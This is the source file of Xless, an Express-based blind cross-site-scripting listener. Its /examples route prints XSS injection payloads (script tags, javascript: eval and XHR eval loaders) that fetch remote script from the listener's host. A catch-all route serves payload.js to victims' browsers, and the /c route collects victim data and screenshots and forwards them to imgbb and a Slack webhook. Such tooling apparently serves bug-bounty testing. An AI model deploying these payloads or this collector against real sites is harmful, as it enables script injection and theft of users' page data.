// Xless: The Serverlesss Blind XSS App.
// Version: v1.2
// Author: Mazin Ahmed <mazin@mazinahmed.net>

const express = require("express");
var bodyParser = require("body-parser");
var cors = require("cors");
const process = require("process");
var request = require("request");
const path = require("path")

// Support local development with .env
require('dotenv').config()

const port = process.env.PORT || 3000;
const imgbb_api_key = process.env.IMGBB_API_KEY
const slack_incoming_webhook = process.env.SLACK_INCOMING_WEBHOOK

const app = express();
app.use(cors());

app.use(bodyParser.json({limit: '15mb'}));
app.use(bodyParser.urlencoded({limit: '15mb', extended: true}));

app.use(function (req, res, next) {
  // Headers
  res.header("Powered-By", "XLESS");
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET,POST");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});


function generate_blind_xss_alert(body) {
  var alert = "*XSSless: Blind XSS Alert*\n";
  for( let k of Object.keys(body)) {
    if (k === "Screenshot") {
      continue
    }


    if (body[k] === "") {
      alert += "*"+k+":* " + "```None```" + "\n"
    } else {
      alert += "*"+k+":* " + "```" + body[k] + "```" + "\n"
    }
  }
  return(alert)
}


function generate_callback_alert(headers, data, url) {
  var alert = "*XSSless: Out-of-Band Callback Alert*\n"
  alert += `• *IP Address:* \`${data["Remote IP"]}\`\n`
  alert += `• *Request URI:* \`${url}\`\n`
  
  // Add all the headers
  for (var key in headers) {
    if (headers.hasOwnProperty(key)) {       
      alert += `• *${key}:* \`${headers[key]}\`\n`
    }
}
  return(alert)
}

function generate_message_alert(body) {
  var alert = "*XSSless: Message Alert*\n"
  alert += "```\n" + body + "```\n";
  return alert
}

async function uploadImage(image) {

  // Return new promise
  return new Promise(function(resolve, reject) {
    const options = {
        method: "POST",
        url: "https://api.imgbb.com/1/upload?key=" + imgbb_api_key,
        port: 443,
        headers: {
            "Content-Type": "multipart/form-data"
        },
        formData : {
            "image" : image
        }
    }

    // Do async request
    request(options, function(err, imgRes, imgBody) {
      if (err) {
        reject(err);
      } else {
        resolve(imgBody);
      }
    })
  })
}

app.get("/examples", (req, res) => {
  res.header("Content-Type", "text/plain")
  //var url = req.protocol + '://' + req.headers['host']
  var url = 'https://' + req.headers['host']
  var page = ""
  page += `\'"><script src="${url}"></script>\n\n`
  page += `javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'${url}\\';document.body.appendChild(a)')\n\n`

  page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`

  page += `<script>$.getScript("${url}")</script>`
  res.send(page)
  res.end()
})

app.all("/message", (req, res) => {
  var message = req.query.text || req.body.text
  const alert = generate_message_alert(message)
  data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}

  request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out)  => {
    res.send("ok\n")
    res.end()
  });
})


app.post("/c", async (req, res) => {
    let data = req.body

    // Upload our screenshot and only then send the Slack alert
    data["Screenshot URL"] = ""

    if (imgbb_api_key && data["Screenshot"]) {
      const encoded_screenshot = data["Screenshot"].replace("data:image/png;base64,","")

      try {
        const imgRes = await uploadImage(encoded_screenshot)
        const imgOut = JSON.parse(imgRes)
        if (imgOut.error) {
          data["Screenshot URL"] = "NA"
        }
        else if(imgOut.data && imgOut.data.url_viewer) {
          // Add the URL to our data array so it will be included on our Slack message
          data["Screenshot URL"] = imgOut.data.url_viewer
        }
      }
      catch (e) {
        data["Screenshot URL"] = e.message
      }
    }

    // Now handle the regular Slack alert
    data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
    const alert = generate_blind_xss_alert(data)
    data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}

    request.post(slack_incoming_webhook, data, (out)  => {
      res.send("ok\n")
      res.end()
    });
})

/**
 * Route to check the health of our xless listener
 */
app.get("/health", async (req, res) => {
    let health_data = {}

    // Check if the environemtn variables are set
    health_data.IMGBB_API_KEY = (imgbb_api_key !== undefined)
    health_data.SLACK_INCOMING_WEBHOOK = (slack_incoming_webhook !== undefined)

    if (!health_data.IMGBB_API_KEY || !health_data.SLACK_INCOMING_WEBHOOK) {
      res.json(health_data)
      res.end()
    }

    const xless_logo = "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"

    try {
      const imgRes = await uploadImage(xless_logo)
      const imgOut = JSON.parse(imgRes)
      if (imgOut.error) {
        health_data.imgbb_response = imgOut.error
      }
      else if(imgOut && imgOut.data && imgOut.data.url_viewer) {
        // Add the URL to our health_data
        health_data.imgbb_response = imgOut.data.url_viewer
      }
    }
    catch (e) {
      health_data.imgbb_response = e.message
    }

    res.json(health_data)
    res.end()
})


app.all("/*", (req, res) => {
  var headers = req.headers
  var data = req.body
  data["Remote IP"] = req.headers["x-forwarded-for"] || req.connection.remoteAddress
  const alert = generate_callback_alert(headers, data, req.url)
  data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}

  request.post(slack_incoming_webhook, data, (out)  => {
    res.sendFile(path.join(__dirname + '/payload.js'))
  });
})


app.listen(port, err => {
    if (err) throw err
    console.log(`> Ready On Server http://localhost:${port}`)
})
